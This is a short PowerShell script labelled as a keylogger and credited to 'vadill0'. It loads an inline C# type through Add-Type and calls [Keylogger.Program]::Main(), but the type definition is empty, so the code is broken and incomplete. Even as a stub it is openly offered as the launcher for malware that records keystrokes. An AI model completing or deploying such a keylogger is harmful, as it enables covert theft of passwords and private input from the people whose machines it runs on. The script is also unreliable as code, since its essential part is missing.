#Powershell keylogger
#author vadill0
Add-Type -TypeDefinition @"

"@ -ReferencedAssemblies System.Windows.Forms
[Keylogger.Program]::Main();